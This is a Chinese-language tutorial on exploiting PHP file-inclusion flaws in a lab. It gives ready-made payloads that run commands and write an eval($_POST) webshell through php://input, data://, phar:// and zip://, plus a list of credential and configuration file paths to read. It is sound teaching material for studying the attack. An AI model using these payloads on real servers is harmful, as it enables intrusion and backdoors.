> 原文链接: https://www.anquanke.com//post/id/248627 


# php文件包含漏洞Getshell的不同姿势


                                阅读量   
                                **16812**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t0190d9c85ffc911ed8.png)](https://p0.ssl.qhimg.com/t0190d9c85ffc911ed8.png)



## 相关函数

php中引发文件包含漏洞的通常是以下四个函数：
1. [include()](http://www.php.net/manual/en/function.include.php)
1. [include_once()](http://php.net/manual/en/function.include-once.php)
1. [require()](http://php.net/manual/en/function.require.php)
1. [require_once()](http://php.net/manual/en/function.require-once.php)
`reuqire()` 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e367e4989e52f60e.png)

`include()` 如果出错的话，只会提出警告，会继续执行后续语句。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t012240b4abdcd24d0c.png)

`require_once()` 和 `include_once()` 功能与`require()` 和 `include()` 类似。但如果一个文件已经被包含过了，则 `require_once()` 和 `include_once()` 则不会再包含它，以避免函数重定义或变量重赋值等问题。

当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：

```
&lt;?php
    $file = $_GET['file'];
    include $file;
?&gt;
```

在同目录下有个phpinfo.txt，其内容为`&lt;? phpinfo(); ?&gt;`。则只需要访问：

```
fileinclude.php?file=phpinfo.txt
```

即可成功解析phpinfo

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01221534011e178a5e.png)

### <a class="reference-link" name="%E5%9C%BA%E6%99%AF"></a>场景
1. 具有相关的文件包含函数。
1. 文件包含函数中存在动态变量，比如 `include $file;`。
1. 攻击者能够控制该变量，比如`$file = $_GET['file'];`。
### <a class="reference-link" name="%E5%88%86%E7%B1%BB"></a>分类

**<a class="reference-link" name="LFI(Local%20File%20Inclusion)%E6%BC%8F%E6%B4%9E"></a>LFI(Local File Inclusion)漏洞**

本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。

这个漏洞不受`allow_url_fopen = On`和`allow_url_include = On`这两个的影响。

比如这里我在php.ini中把它们改成off，然后重启服务器：

[![](https://p3.ssl.qhimg.com/t01f658f7edc65c9d4c.png)](https://p3.ssl.qhimg.com/t01f658f7edc65c9d4c.png)

访问`?page=../../../phpinfo.php`，依然可以成功解析phpinfo

[![](https://p4.ssl.qhimg.com/t014f769974cb8ca608.png)](https://p4.ssl.qhimg.com/t014f769974cb8ca608.png)

**<a class="reference-link" name="RFI(Remote%20File%20Inclusion)%E6%BC%8F%E6%B4%9E"></a>RFI(Remote File Inclusion)漏洞**

远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>
但RFI的利用条件较为苛刻，需要php.ini中进行配置
1. `allow_url_fopen = On`
1. `allow_url_include = On`
两个配置选项均需要为On，才能远程包含文件成功。

比如这里我在php.ini中把它们改成off，然后重启服务器：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a87cf4fa69c790b4.png)

访问`?page=http://192.168.1.4`，会报错：

```
Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_fopen=0 in D:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php on line 36

Warning: include(http://192.168.1.4): failed to open stream: no suitable wrapper could be found in D:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php on line 36

Warning: include(): Failed opening 'http://192.168.1.4' for inclusion (include_path='.;C:\php\pear;../../external/phpids/0.6/lib/') in D:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php on line 36
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t010cace12a5ff1c90a.png)

两个配置选项都改回来变成on，再重启服务器，远程文件包含便成功了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e545cf7e9d235e2c.png)

### <a class="reference-link" name="%E8%A6%81%E6%9F%A5%E7%9C%8B%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"></a>要查看的敏感文件的绝对路径

这篇文章更加详细：[Windows linux 敏感目录 路径汇总](https://blog.csdn.net/weixin_50464560/article/details/119063335)

这里也列一下会用到的敏感文件的绝对路径：

```
WINDOWS下:
c:/boot.ini //查看系统版本

c:/windows/php.ini //php配置信息

c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码

c:/winnt/php.ini

c:/winnt/my.ini

C:\Windows\win.ini  //用于保存系统配置文件

c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码

c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码

c:\Program Files\Serv-U\ServUDaemon.ini

c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置

c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码

c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此

c:\Program Files\RhinoSoft.com\ServUDaemon.exe

C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件

//存储了pcAnywhere的登陆密码

c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件

c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.

c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机

d:\APACHE\Apache2\conf\httpd.conf

C:\Program Files\mysql\my.ini

C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码

LUNIX/UNIX 下:
/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件

/usr/local/apache2/conf/httpd.conf

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置

/usr/local/app/php5/lib/php.ini //PHP相关设置

/etc/sysconfig/iptables //从中得到防火墙规则策略

/etc/httpd/conf/httpd.conf // apache配置文件

/etc/rsyncd.conf //同步程序配置文件

/etc/my.cnf //mysql的配置文件

/etc/redhat-release //系统版本

/etc/issue

/etc/issue.net

/usr/local/app/php5/lib/php.ini //PHP相关设置

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置

/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件

/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看

/usr/local/resin-pro-3.0.22/conf/resin.conf 同上

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看

/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件

/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看

/usr/local/resin-pro-3.0.22/conf/resin.conf 同上

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看

/etc/sysconfig/iptables 查看防火墙策略
```



## 包含姿势

下面例子中测试代码均为：

```
&lt;?php
    $file = $_GET['file'];
    include $file;
?&gt;
```

`allow_url_fopen` 默认为 On<br>`allow_url_include` 默认为 Off

若有特殊要求，会在利用条件里指出。

### <a class="reference-link" name="php%E4%BC%AA%E5%8D%8F%E8%AE%AE"></a>php伪协议

PHP 带有很多内置 URL 风格的封装协议，可用于类似 `fopen()`、 `copy()`、 `file_exists()` 和 `filesize()` 的文件系统函数。 除了这些封装协议，还能通过 `stream_wrapper_register()` 来注册自定义的封装协议。

PHP伪协议事实上就是支持的协议与封装协议（12种）

```
file:// — 访问本地文件系统

http:// — 访问 HTTP(s) 网址

ftp:// — 访问 FTP(s) URLs

php:// — 访问各个输入/输出流（I/O streams）
PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

zlib:// — 压缩流

data:// — 数据（RFC 2397）

glob:// — 查找匹配的文件路径模式

phar:// — PHP 归档

ssh2:// — Secure Shell 2

rar:// — RAR

ogg:// — 音频流

expect:// — 处理交互式的流
```

**<a class="reference-link" name="file://"></a>file://**

file://伪协议用于访问本地文件系统

利用条件：
1. 对allow_url_include不做要求。
1. 对allow_url_fopen不做要求。
姿势：

```
fileinclude.php?file=file://C:/Windows/win.ini
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e01dacbd448af196.png)

**<a class="reference-link" name="php://input"></a>php://input**

可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 `enctype="multipart/form-data"` 的时候 `php://input` 是无效的。

利用条件：
1. allow_url_include = On。
1. 对allow_url_fopen不做要求。
姿势：

```
fileinclude.php?file=php://input

POST:
&lt;?php phpinfo(); ?&gt;

```

[![](https://p3.ssl.qhimg.com/t01016035a7cb813fa9.png)](https://p3.ssl.qhimg.com/t01016035a7cb813fa9.png)

#### 注意：碰到`file_get_contents()`就要想到用`php://input`绕过

碰到`file_get_contents()`就要想到用`php://input`绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。

`file_get_contents()`：这个函数就是把一个文件里面的东西 （字符）全部return出来作为字符串。
- 除此之外，通过实践我发现这个函数如果直接把字符串当作参数会报错，但如果包含的是http协议的网址，则会像`curl`命令一样，把源码读出来。而php伪协议也是识别http协议的，所以说上面`php://input`可以将POST的数据读过来来赋值给参数。
**测试代码：**

```
&lt;?php
    echo file_get_contents("php://input");
?&gt;
```

结果：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0194e56352f4df72eb.png)

<a class="reference-link" name="php://input%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"></a>**php://input（命令执行）**

利用条件：
1. allow_url_include = On。
1. 对allow_url_fopen不做要求。
姿势：

```
fileinclude.php?file=php://input

POST:
&lt;?php system('whoami'); ?&gt;

```

[![](https://p3.ssl.qhimg.com/t01feb7db17e3f0ba02.png)](https://p3.ssl.qhimg.com/t01feb7db17e3f0ba02.png)

<a class="reference-link" name="php://input%EF%BC%88%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC%EF%BC%89"></a>**php://input（写入木马）**

利用条件：
1. allow_url_include = On。
1. 对allow_url_fopen不做要求。
姿势：

```
fileinclude.php?file=php://input

POST:
&lt;?php fputs(fopen('hack.php','w'),'&lt;?php @eval($_POST[v])?&gt;');?&gt;
```

执行完，同目录下便生成了马儿：

[![](https://p1.ssl.qhimg.com/t01b3723bb5ec0ac1c5.png)](https://p1.ssl.qhimg.com/t01b3723bb5ec0ac1c5.png)

用shell管理工具，比如蚁剑等便能成功连接。

<a class="reference-link" name="php://filter"></a>**php://filter**

元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。

利用条件：
1. 对allow_url_include不做要求。
1. 对allow_url_fopen不做要求。
姿势：

```
fileinclude.php?file=php://filter/read=convert.base64-encode/resource=index.php

另外一种：fileinclude.php?file=php://filter/convert.base64-encode/resource=index.php
//效果跟前面的一样，少了read等关键字。在绕过一些waf时也许有用。
```

通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01bb043f5ec0891c18.png)

其中`PD9waHAKZWNobyAiSGVsbG8gV29ybGQiOwo/Pg==`base64解码出来为如下，刚好是我同目录下的index.php的文件源码：

```
&lt;?php
echo "Hello World";
?&gt;
```

**<a class="reference-link" name="phar://"></a>phar://**

这个就是php解压缩包的一个伪协议，不管后缀是什么，都会当做压缩包来解压。

利用条件：
1. php版本大于等于php5.3.0
1. 对allow_url_include不做要求。
1. 对allow_url_fopen不做要求。
姿势：

写一个文件phpinfo.php，其内容为`&lt;?php phpinfo(); ?&gt;`，打包成zip压缩文件格式的压缩包，如下：

[![](https://p0.ssl.qhimg.com/t01da3a3524e70f5841.png)](https://p0.ssl.qhimg.com/t01da3a3524e70f5841.png)

指定绝对路径:

```
fileinclude.php?file=phar://D:/phpStudy/PHPTutorial/WWW/test.zip/phpinfo.php
```

或者使用相对路径（这里`test.zip`就在当前目录下，和`fileinclude.php`同一目录）:

```
fileinclude.php?file=phar://test.zip/phpinfo.php
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d21f0370fbab1a7a.png)

**注意**：其中`test.zip`必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过`test.zip`的后缀可以不是zip，可以是像`test.jpg`，甚至`test.111`这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为`test.111`这样的后缀肯定不会被拦截了，这时就能成功：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a50ba1ff96c58cfe.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010018b0d16ddeb29a.png)

<a class="reference-link" name="phar://%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"></a>**phar://（命令执行）**

利用条件：
1. php版本大于等于php5.3.0
1. 对allow_url_include不做要求。
1. 对allow_url_fopen不做要求。
姿势：

同`phar://`，只不过把文件内容改成`&lt;?php system('whoami');?&gt;`

<a class="reference-link" name="phar://%EF%BC%88%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC%EF%BC%89"></a>**phar://（写入木马）**

利用条件：
1. php版本大于等于php5.3.0
1. 对allow_url_include不做要求。
1. 对allow_url_fopen不做要求。
姿势：

写一个木马shell.php，其内容为`&lt;?php [@eval](https://github.com/eval)($_POST[v]);?&gt;`，打包成zip压缩文件格式的压缩包，如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014e6490a3b230ea2f.png)

指定绝对路径

```
http://192.168.1.4/fileinclude.php?file=phar://D:/phpStudy/PHPTutorial/WWW/test.zip/shell.php
```

或者使用相对路径（这里`test.zip`就在当前目录下）

```
http://192.168.1.4/fileinclude.php?file=phar://test.zip/shell.php
```

先访问url地址，然后马儿就写进去了。

然后用shell管理工具，将上面两个的url地址随便选一个，填写到shell管理工具的url地址里，比如蚁剑等便能成功连接。

[![](https://p0.ssl.qhimg.com/t0136fdc822f07013c1.png)](https://p0.ssl.qhimg.com/t0136fdc822f07013c1.png)

**注意**：其中`test.zip`必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过`test.zip`的后缀可以不是zip，可以是像`test.jpg`，甚至`test.111`这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为`test.111`这样的后缀肯定不会被拦截了，这时就能成功。

**<a class="reference-link" name="zip://"></a>zip://**

zip伪协议和phar伪协议类似，但是用法不一样。

利用条件：
1. php版本大于等于php5.3.0
1. 对allow_url_include不做要求。
1. 对allow_url_fopen不做要求。
姿势：<br>
构造zip包的方法同phar：

写一个文件phpinfo.php，其内容为`&lt;?php phpinfo(); ?&gt;`，打包成zip压缩文件格式的压缩包，如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b7f8fb5f276c39c8.png)

但是使用zip伪协议，需要指定绝对路径，而且压缩包文件和压缩包内的文件之间得用`#`，还要将`#`给URL编码为`%23`，之后填上压缩包内的文件。

```
fileinclude.php?file=zip://D:/phpStudy/PHPTutorial/WWW/test.zip%23phpinfo.php
```

若是使用相对路径，则会文件包含失败。

**注意**：这里需要注意的和`phar://`中的注意一样，其中`test.zip`必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过`test.zip`的后缀可以不是zip，可以是像`test.jpg`，甚至`test.111`这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为`test.111`这样的后缀肯定不会被拦截了，这时就能成功：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d121c348c5942daf.png)

<a class="reference-link" name="zip://%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"></a>**zip://（命令执行）**

利用条件：
1. php版本大于等于php5.3.0
1. 对allow_url_include不做要求。
1. 对allow_url_fopen不做要求。
姿势：

同`zip://`，只不过把文件内容改成`&lt;?php system('whoami');?&gt;`

<a class="reference-link" name="zip://%EF%BC%88%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC%EF%BC%89"></a>**zip://（写入木马）**

利用条件：
1. php版本大于等于php5.3.0
1. 对allow_url_include不做要求。
1. 对allow_url_fopen不做要求。
姿势：<br>
构造zip包的方法同phar：

写一个木马shell.php，其内容为`&lt;?php [@eval](https://github.com/eval)($_POST[v]);?&gt;`，打包成zip压缩文件格式的压缩包，如下：

[![](https://p2.ssl.qhimg.com/t017c103ca8a6934f38.png)](https://p2.ssl.qhimg.com/t017c103ca8a6934f38.png)

但是使用zip伪协议，需要指定绝对路径，而且压缩包文件和压缩包内的文件之间得用`#`，还要将`#`给URL编码为`%23`，之后填上压缩包内的文件。

```
http://192.168.1.4/fileinclude.php?file=zip://D:/phpStudy/PHPTutorial/WWW/test.zip%23shell.php
```

先访问该url地址，然后马儿就写进去了。

若是使用相对路径，则会getshell失败。

**注意**：这里需要注意的和`phar://`中的注意一样，其中`test.zip`必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过`test.zip`的后缀可以不是zip，可以是像`test.jpg`，甚至`test.111`这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为`test.111`这样的后缀肯定不会被拦截了，这时就能成功：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01eab50d98c4e5daaf.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0116fc8fd2617ce859.png)

<a class="reference-link" name="data://"></a>**data://**

数据流封装器，和`php://`相似，都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。

利用条件：
1. php版本大于等于php5.2
1. allow_url_fopen = On
1. allow_url_include = On
姿势一：

```
fileinclude.php?file=data:text/plain,&lt;?php phpinfo();?&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a535fe6d57397610.png)

姿势二：

```
fileinclude.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

`PD9waHAgcGhwaW5mbygpOz8+`的base64解码为：`&lt;?php phpinfo();?&gt;`。其中加号`+`的url编码为`%2b`。如果不手动url编码会报错：`Parse error:  syntax error, unexpected '?' in data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8  on line 1`

<a class="reference-link" name="data://%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"></a>**data://（命令执行）**

利用条件：
1. php版本大于等于php5.2
1. allow_url_fopen = On
1. allow_url_include = On
姿势一：

```
fileinclude.php?file=data:text/plain,&lt;?php system('whoami');?&gt;
```

姿势二：

```
fileinclude.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
```

其中`PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==`的base64解码为：`&lt;?php system('whoami');?&gt;`

<a class="reference-link" name="data://%EF%BC%88%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC%EF%BC%89"></a>**data://（写入木马）**

利用条件：
1. php版本大于等于php5.2
1. allow_url_fopen = On
1. allow_url_include = On
姿势一：

```
fileinclude.php?file=data:text/plain,&lt;?php fputs(fopen('hack.php','w'),'&lt;?php @eval($_POST[v])?&gt;');?&gt;
```

[![](https://p0.ssl.qhimg.com/t0124975d224ae1d94b.png)](https://p0.ssl.qhimg.com/t0124975d224ae1d94b.png)

用shell管理工具，比如蚁剑等便能成功连接。

姿势二：

```
fileinclude.php?file=data:text/plain;base64,PD9waHAgZnB1dHMoZm9wZW4oJ2hhY2sucGhwJywndycpLCc8P3BocCBAZXZhbCgkX1BPU1Rbdl0pPz4nKTs/Pg==
```

其中`PD9waHAgZnB1dHMoZm9wZW4oJ2hhY2sucGhwJywndycpLCc8P3BocCBAZXZhbCgkX1BPU1Rbdl0pPz4nKTs/Pg==`的base64解码为：`&lt;?php fputs(fopen('hack.php','w'),'&lt;?php [@eval](https://github.com/eval)($_POST[v])?&gt;');?&gt;`

### <a class="reference-link" name="%E5%8C%85%E5%90%ABsession"></a>包含session

利用条件：session文件路径已知，且其中内容部分可控。

姿势：

php的session文件的保存路径可以在phpinfo的`session.save_path`看到。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01eef65e83d9b99ce5.png)

这里顺便提一下：第二列是`Local Value`（局部变量），第三列是`Master Value`（主变量）。其中`Master Value`是PHP.ini文件中的内容。`Local value`是当前目录中的设置，这个值会覆盖`Master Value`中对应的值。所以看的是第二列当前目录中的设置`D:\phpStudy\PHPTutorial\tmp\tmp`。

常见的php-session存放位置：
1. `/var/lib/php/sess_PHPSESSID`
1. `/var/lib/php/sess_PHPSESSID`
1. `/tmp/sess_PHPSESSID`
1. `/tmp/sessions/sess_PHPSESSID`
session的文件名格式为`sess_[phpsessid]`。而phpsessid在发送的请求的cookie字段中可以看到。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015a8e17e5fd3092df.png)

要包含并利用的话，需要能控制部分session文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。

这里来两个例子:

例子1：

```
# 第3行
session_start();
if($_SESSION['username']) `{`
    header('Location: index.php');
    exit;
`}`
# 第8行
if($_POST['username'] &amp;&amp; $_POST['password']) `{`
    $username = $_POST['username'];

# 第20行
    $stmt-&gt;bind_result($res_password);
# 第24行
    if ($res_password == $password) `{`
        $_SESSION['username'] = base64_encode($username);
        header("location:index.php");
```

这里使用了session来保存用户会话，[php手册](http://php.net/manual/zh/session.examples.basic.php)中是这样描述的：
1. PHP 会将会话中的数据设置到 `$_SESSION` 变量中。
1. 当 PHP 停止的时候，它会自动读取 `$_SESSION` 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。
1. 对于文件会话保存管理器，会将会话数据保存到配置项 `session.save_path` 所指定的位置。
考虑到变量`$username`是我们可控的，并且被设置到了`$_SESSION`中，因此我们输入的数据未经过滤的就被写入到了对应的sessioin文件中。结合前面的php文件包含，可以推测这里可以包含session文件。

要包含session文件，需要知道文件的路径。先注册一个用户，比如Johnson。等登陆成功后，记录下cookie中的PHPSESSID的值，这里为0d0385dc6a1067f4e3406191（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，名称都为`sess_cookie值`）

访问：

```
http://x.x.x.x/index.php?action=/var/lib/php5/sess_0d0385dc6a1067f4e3406191
```

其中`/var/lib/php5/`的session文件路径是测试出来的，常见的php-session存放位置在上面也有列出来了。

这里能包含，并且控制session文件，但要写入可用的payload，还需要绕过：

```
$_SESSION['username'] = base64_encode($username);
```

如前面所示，输入的用户名会被base64加密。如果直接用php伪协议来解密整个session文件，由于序列化的前缀，肯定会导致乱码。

那么这里需要考虑一下base64的编码过程。比如编码abc。

```
未编码: abc
转成ascii码： 97 98 99
转成对应二进制（三组，每组8位）： 01100001 01100010 01100011
重分组（四组，每组6位）： 011000 010110 001001 100011
每组高位补零，变为每组8位：00011000 00010110 00001001 00100011
每组对应转为十进制： 24 22 9 35
查Base64编码表得： Y W J j
```

考虑一下session的前缀：`username|s:12:"`，中间的数字12表示后面base64串的长度。当base64串的长度小于100时，前缀的长度固定为15个字符，当base64串的长度大于100小于1000时，前缀的长度固定为16个字符。

由于16个字符，恰好满足以下条件：

```
16个字符 =&gt; 16 * 6 = 96 位 =&gt; 96 mod 8 = 0
```

